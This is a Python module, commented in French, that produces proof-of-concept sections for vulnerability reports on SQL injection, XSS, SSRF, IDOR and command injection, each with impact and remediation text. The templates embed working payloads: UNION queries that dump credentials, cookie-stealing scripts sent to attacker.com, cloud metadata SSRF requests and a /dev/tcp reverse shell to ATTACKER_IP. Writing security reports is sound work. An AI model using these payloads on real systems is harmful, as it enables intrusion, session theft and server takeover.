"""
Module de génération de PoC (Proof of Concept) standardisés
"""


def generate_poc_for_vulnerability(vulnerability):
    """
    Génère un PoC standardisé pour une vulnérabilité
    
    Args:
        vulnerability: Dict avec détails de la vulnérabilité
    
    Returns:
        str: PoC formaté
    """
    vuln_name = vulnerability.get("name", "").lower()
    vuln_type = detect_vulnerability_type(vulnerability)
    
    # Générer PoC selon le type
    if "sql injection" in vuln_name or vuln_type == "injection":
        return generate_sql_injection_poc(vulnerability)
    elif "xss" in vuln_name or vuln_type == "xss":
        return generate_xss_poc(vulnerability)
    elif "ssrf" in vuln_name or vuln_type == "ssrf":
        return generate_ssrf_poc(vulnerability)
    elif "idor" in vuln_name or "access control" in vuln_name:
        return generate_idor_poc(vulnerability)
    elif "command injection" in vuln_name:
        return generate_command_injection_poc(vulnerability)
    else:
        return generate_generic_poc(vulnerability)


def detect_vulnerability_type(vulnerability):
    """Détecte le type de vulnérabilité"""
    name = vulnerability.get("name", "").lower()
    desc = vulnerability.get("description", "").lower()
    text = f"{name} {desc}"
    
    if "sql" in text or "nosql" in text:
        return "injection"
    elif "xss" in text or "cross-site scripting" in text:
        return "xss"
    elif "ssrf" in text or "server-side request forgery" in text:
        return "ssrf"
    elif "idor" in text or "direct object reference" in text:
        return "idor"
    elif "command" in text:
        return "command_injection"
    elif "auth" in text or "login" in text:
        return "authentication"
    else:
        return "generic"


def generate_sql_injection_poc(vulnerability):
    """Génère un PoC pour injection SQL"""
    location = vulnerability.get("location", "/endpoint")
    param = vulnerability.get("parameter", "id")
    method = vulnerability.get("http_method", "GET").upper()
    
    poc = f"""# Proof of Concept - SQL Injection

## Localisation
Endpoint: {location}
Paramètre: {param}
Méthode: {method}

## Requête HTTP vulnérable

```bash
# Test 1 : Détection basique
curl -X {method} 'https://target.com{location}?{param}=1\\' OR \\'1\\'=\\'1' -H 'User-Agent: Mozilla/5.0'

# Test 2 : Extraction de schéma
curl -X {method} 'https://target.com{location}?{param}=1 UNION SELECT table_name, NULL FROM information_schema.tables' -H 'User-Agent: Mozilla/5.0'

# Test 3 : Extraction de données
curl -X {method} 'https://target.com{location}?{param}=1 UNION SELECT username, password FROM users LIMIT 10' -H 'User-Agent: Mozilla/5.0'
```

## Résultat attendu

Les requêtes ci-dessus permettent d'extraire des informations de la base de données
sans authentification valide, confirmant la vulnérabilité d'injection SQL.

## Impact

- Extraction complète de la base de données
- Compromission potentielle de tous les comptes utilisateurs
- Violation de confidentialité des données personnelles

## Recommandation

Implémenter des requêtes préparées (Prepared Statements) et valider/sanitizer
toutes les entrées utilisateur."""
    
    return poc


def generate_xss_poc(vulnerability):
    """Génère un PoC pour XSS"""
    location = vulnerability.get("location", "/endpoint")
    param = vulnerability.get("parameter", "input")
    
    poc = f"""# Proof of Concept - Cross-Site Scripting (XSS)

## Localisation
Endpoint: {location}
Paramètre: {param}

## Requête HTTP vulnérable

```bash
# Test 1 : Alert basique
curl -X GET 'https://target.com{location}?{param}=<script>alert(1)</script>' \\
  -H 'User-Agent: Mozilla/5.0'

# Test 2 : Cookie theft
curl -X GET 'https://target.com{location}?{param}=<script>fetch(\\'https://attacker.com/steal?cookie=\\'+document.cookie)</script>' \\
  -H 'User-Agent: Mozilla/5.0'

# Test 3 : Session hijacking
curl -X GET 'https://target.com{location}?{param}=<img src=x onerror="fetch(\\'https://attacker.com?session=\\'+document.cookie)">' \\
  -H 'User-Agent: Mozilla/5.0'
```

## Résultat attendu

Les scripts malveillants sont exécutés côté client, permettant :
- Vol de cookies de session
- Prise de contrôle de session utilisateur
- Redirection vers sites malveillants

## Impact

- Account Takeover (ATO)
- Vol de données sensibles
- Phishing des utilisateurs
- Compromission de réputation

## Recommandation

Implémenter une politique CSP (Content Security Policy) stricte et encoder
toutes les sorties HTML pour éviter l'exécution de scripts."""
    
    return poc


def generate_ssrf_poc(vulnerability):
    """Génère un PoC pour SSRF"""
    location = vulnerability.get("location", "/endpoint")
    param = vulnerability.get("parameter", "url")
    
    poc = f"""# Proof of Concept - Server-Side Request Forgery (SSRF)

## Localisation
Endpoint: {location}
Paramètre: {param}

## Requête HTTP vulnérable

```bash
# Test 1 : Accès localhost
curl -X POST 'https://target.com{location}' \\
  -H 'Content-Type: application/json' \\
  -d '{{"{param}": "http://localhost:8080/admin"}}'

# Test 2 : Accès métadonnées cloud (AWS)
curl -X POST 'https://target.com{location}' \\
  -H 'Content-Type: application/json' \\
  -d '{{"{param}": "http://169.254.169.254/latest/meta-data/"}}'

# Test 3 : Accès métadonnées cloud (Azure)
curl -X POST 'https://target.com{location}' \\
  -H 'Content-Type: application/json' \\
  -d '{{"{param}": "http://169.254.169.254/metadata/instance"}}'

# Test 4 : Scan réseau interne
curl -X POST 'https://target.com{location}' \\
  -H 'Content-Type: application/json' \\
  -d '{{"{param}": "http://10.0.0.1"}}'
```

## Résultat attendu

Le serveur fait des requêtes vers des ressources non autorisées,
permettant :
- Accès aux métadonnées cloud (IAM keys)
- Scan de réseau interne
- Bypass de firewall

## Impact

- Compromission de l'infrastructure cloud
- Vol de credentials cloud
- Pivotement vers réseau interne
- Élévation de privilèges

## Recommandation

Valider strictement les URLs acceptées (whitelist), désactiver l'accès
aux métadonnées cloud, et filtrer les requêtes vers localhost/réseau interne."""
    
    return poc


def generate_idor_poc(vulnerability):
    """Génère un PoC pour IDOR"""
    location = vulnerability.get("location", "/api/user/123")
    
    poc = f"""# Proof of Concept - Insecure Direct Object Reference (IDOR)

## Localisation
Endpoint: {location}

## Requête HTTP vulnérable

```bash
# Test 1 : Accès à un autre utilisateur
curl -X GET 'https://target.com/api/user/123' \\
  -H 'Authorization: Bearer YOUR_TOKEN'

# Test 2 : Modification ID utilisateur
curl -X PUT 'https://target.com/api/user/456' \\
  -H 'Authorization: Bearer YOUR_TOKEN' \\
  -H 'Content-Type: application/json' \\
  -d '{{"email": "attacker@evil.com"}}'

# Test 3 : Suppression ID utilisateur
curl -X DELETE 'https://target.com/api/user/789' \\
  -H 'Authorization: Bearer YOUR_TOKEN'
```

## Résultat attendu

L'utilisateur peut accéder, modifier ou supprimer des ressources
appartenant à d'autres utilisateurs sans autorisation appropriée.

## Impact

- Violation de confidentialité des données
- Manipulation de comptes utilisateurs
- Compromission de l'intégrité des données

## Recommandation

Implémenter des contrôles d'autorisation appropriés, vérifier que
l'utilisateur a le droit d'accéder à la ressource demandée."""
    
    return poc


def generate_command_injection_poc(vulnerability):
    """Génère un PoC pour command injection"""
    location = vulnerability.get("location", "/endpoint")
    param = vulnerability.get("parameter", "cmd")
    
    poc = f"""# Proof of Concept - Command Injection

## Localisation
Endpoint: {location}
Paramètre: {param}

## Requête HTTP vulnérable

```bash
# Test 1 : Commande Unix basique
curl -X GET 'https://target.com{location}?{param}=whoami' \\
  -H 'User-Agent: Mozilla/5.0'

# Test 2 : Exécution multiple
curl -X GET 'https://target.com{location}?{param}=ping -c 1 127.0.0.1' \\
  -H 'User-Agent: Mozilla/5.0'

# Test 3 : Reverse shell (si autorisé)
curl -X GET 'https://target.com{location}?{param}=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \\
  -H 'User-Agent: Mozilla/5.0'
```

## Résultat attendu

L'attaquant peut exécuter des commandes système arbitraires sur le serveur.

## Impact

- Compromission complète du serveur
- Accès root/system
- Vol de données sensibles
- Pivotement vers réseau interne

## Recommandation

Ne jamais passer d'entrées utilisateur directement aux fonctions système.
Utiliser des whitelists de commandes autorisées et échapper tous les caractères spéciaux."""
    
    return poc


def generate_generic_poc(vulnerability):
    """Génère un PoC générique"""
    location = vulnerability.get("location", "/endpoint")
    param = vulnerability.get("parameter", "param")
    
    poc = f"""# Proof of Concept

## Localisation
Endpoint: {location}
Paramètre: {param}

## Requête HTTP vulnérable

```bash
# Requête de test
curl -X GET 'https://target.com{location}?{param}=test_value' \\
  -H 'User-Agent: Mozilla/5.0' \\
  -H 'Accept: application/json'
```

## Description

{vulnerability.get('description', 'Vulnérabilité détectée')}

## Impact

{vulnerability.get('impact', 'Impact à déterminer')}

## Recommandation

{vulnerability.get('remediation', 'Mettre en place des contrôles de sécurité appropriés')}"""
    
    return poc


def format_vulnerability_for_report(vulnerability, include_poc=True):
    """
    Formate une vulnérabilité complète pour le rapport
    
    Args:
        vulnerability: Dict avec détails
        include_poc: Inclure le PoC dans la sortie
    
    Returns:
        dict formaté pour le rapport
    """
    formatted = {
        "id": vulnerability.get("id", f"VULN-{vulnerability.get('cvss_score', 0):.0f}"),
        "title": vulnerability.get("name", "Vulnérabilité"),
        "severity": vulnerability.get("severity", "UNKNOWN"),
        "cvss_score": vulnerability.get("cvss_score", 0.0),
        "cvss_vector": vulnerability.get("cvss_vector", ""),
        "location": vulnerability.get("location", "/unknown"),
        "description": vulnerability.get("description", ""),
        "impact": vulnerability.get("impact", ""),
        "remediation": vulnerability.get("remediation", ""),
        "status": vulnerability.get("status", "Non corrigé")
    }
    
    if include_poc:
        formatted["poc"] = generate_poc_for_vulnerability(vulnerability)
    
    return formatted

